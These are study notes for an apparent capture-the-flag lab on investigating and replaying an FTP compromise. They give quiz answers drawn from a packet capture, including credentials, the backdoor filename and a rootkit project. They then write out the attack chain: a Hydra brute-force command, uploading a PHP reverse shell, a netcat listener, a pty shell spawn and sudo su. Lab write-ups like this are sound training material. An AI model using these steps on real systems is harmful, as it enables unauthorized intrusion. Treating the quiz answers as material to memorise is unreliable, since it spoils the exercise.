# Hacked

> Converted from cybersecurity DOCX notes into a structured markdown outline and study reference.

It seems like our machine got hacked by an anonymous threat actor. However, we are lucky to have a .pcap file from the attack. Can you determine what happened? Download the .pcap file and use Wireshark to view it.

The attacker is trying to log into a specific service. What service is this?

There is a very popular tool by Van Hauser which can be used to brute force a series of services. What is the name of this tool?

The attacker is trying to log on with a specific username. What is the username?

- **Answer:** jenny

### What is the user's password?

- **Answer:** password123

### What is the current FTP working directory after the attacker logged in?

- **Answer:** /var/www/html

The attacker uploaded a backdoor. What is the backdoor's filename?

- **Answer:** shell.php

The backdoor can be downloaded from a specific URL, as it is located inside the uploaded file. What is the full URL?

- **Answer:** http://pentestmonkey.net/tools/php-reverse-shell

### Which command did the attacker manually execute after getting a reverse shell?

- **Answer:** whoami

### What is the computer's hostname?

- **Answer:** / wir3

### Which command did the attacker execute to spawn a new TTY shell?

- **Answer:** python3 -c 'import pty; pty.spawn("/bin/bash")'

### Which command was executed to gain a root shell?

- **Answer:** sudo su

The attacker downloaded something from GitHub. What is the name of the GitHub project?

- **Answer:** reptile

The project can be used to install a stealthy backdoor on the system. It can be very hard to detect. What is this type of backdoor called?

- **Answer:** rootkit

Deploy the machine.

The attacker has changed the user's password!

### Can you replicate the attacker's steps and read the flag.txt?

The flag is located in the /root/Reptile directory.

Remember, you can always look back at the .pcap file if necessary. Good luck!

Run Hydra (or any similar tool) on the FTP service.

```text
:> hydra -t 1 -V -f -l jenny -P /usr/share/wordlists/rockyou.txt 10.10.2.134 ftp
```

- **Answer:** [21][ftp] host: 10.10.2.134 login: jenny password: 987654321

The attacker might not have chosen a complex password.

You might get lucky if you use a common word list.

Change the necessary values inside the web shell and upload it to the webserver

- copy the same webshell from /usr/share/webshell/php to the attack folder

- rename to something better

- alter the listening ip and port

```text
:>binary (to switch to binary upload / download mode
:>put <webshell>
```

- kid:> chmod 777 <shell>

Create a listener on the designated port on your attacker machine. Execute the web shell by visiting the .php file on the targeted web server.

## On attacker

```text
:>nc -nvlp 4545
```

On target, in brower

:http://<target ip>/<web shell file name>

- coult have also tried curl

```text
:>python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Become root!

Read the flag.txt file inside the Reptile directory

## A
